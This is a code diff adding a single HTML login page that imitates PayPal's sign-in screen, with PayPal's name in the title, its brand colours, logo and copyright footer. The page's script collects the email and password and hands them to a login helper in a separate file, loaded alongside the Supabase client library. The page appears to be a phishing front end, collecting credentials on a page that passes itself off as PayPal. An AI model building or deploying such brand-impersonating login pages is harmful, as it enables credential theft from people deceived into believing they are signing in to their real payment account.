@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal | Login</title>
+    <link rel="manifest" href="manifest.json">
+    <link rel="icon" type="image/png" href="logo.png">
+    <meta property="og:image" content="meta.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        ppBlue: '#001C64',
+                        ppAction: '#0070BA',
+                        ppBg: '#FFFFFF',
+                        ppSurface: '#F5F7FA',
+                        ppBorder: '#E5E7EB'
+                    },
+                    fontFamily: { sans: ['Plus Jakarta Sans', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { letter-spacing: -0.01em; }
+        .login-card { max-width: 400px; width: 100%; }
+    </style>
+</head>
+<body class="bg-ppBg text-slate-900 min-h-screen flex flex-col items-center justify-center p-6">
+
+    <div class="login-card animate-in fade-in slide-in-from-bottom-4 duration-500">
+        <div class="text-center mb-10">
+            <img src="logo.png" class="h-10 mx-auto mb-6">
+        </div>
+
+        <form id="login-form" class="space-y-4">
+            <div class="space-y-2">
+                <input type="text" id="username" placeholder="Email or mobile number" 
+                    class="w-full border border-slate-300 rounded-lg py-4 px-4 outline-none focus:border-ppAction transition-all text-sm">
+            </div>
+            <div class="space-y-2">
+                <input type="password" id="password" placeholder="Password" 
+                    class="w-full border border-slate-300 rounded-lg py-4 px-4 outline-none focus:border-ppAction transition-all text-sm">
+            </div>
+
+            <button type="submit" class="w-full py-4 bg-ppBlue text-white rounded-full font-bold text-sm hover:bg-ppAction transition-all shadow-lg active:scale-[0.98]">Log In</button>
+            
+            <div class="flex items-center gap-4 py-4">
+                <div class="h-px bg-slate-200 flex-1"></div>
+                <span class="text-xs text-slate-400 font-medium uppercase tracking-widest">or</span>
+                <div class="h-px bg-slate-200 flex-1"></div>
+            </div>
+
+            <button type="button" class="w-full py-4 border-2 border-ppBlue text-ppBlue rounded-full font-bold text-sm hover:bg-ppSurface transition-all">Sign Up</button>
+        </form>
+
+        <div class="mt-10 text-center space-y-4">
+            <a href="#" class="text-xs text-ppAction font-bold hover:underline">Forgot password?</a>
+            <div class="flex justify-center gap-6 text-[10px] text-slate-400 font-bold uppercase tracking-wider">
+                <a href="#" class="hover:text-ppBlue">English</a>
+                <a href="#" class="hover:text-ppBlue">Français</a>
+                <a href="#" class="hover:text-ppBlue">Español</a>
+                <a href="#" class="hover:text-ppBlue">中文</a>
+            </div>
+        </div>
+    </div>
+
+    <footer class="mt-auto py-8 text-center">
+        <p class="text-[10px] text-slate-400 font-medium">© 1999–2026 PayPal. All rights reserved.</p>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="../utils.js"></script>
+    <script>
+        document.getElementById('login-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = e.target.querySelector('button[type="submit"]');
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            btn.disabled = true;
+            btn.innerHTML = '<i class="ph ph-circle-notch animate-spin"></i> Checking details...';
+
+            utils.init();
+            const userData = await utils.login(user, pass);
+            
+            if (userData) {
+                window.location.href = 'dashboard.html';
+            } else {
+                alert('Invalid credentials. Please try again.');
+                btn.disabled = false;
+                btn.textContent = 'Log In';
+            }
+        });
+    </script>
+</body>
+</html>
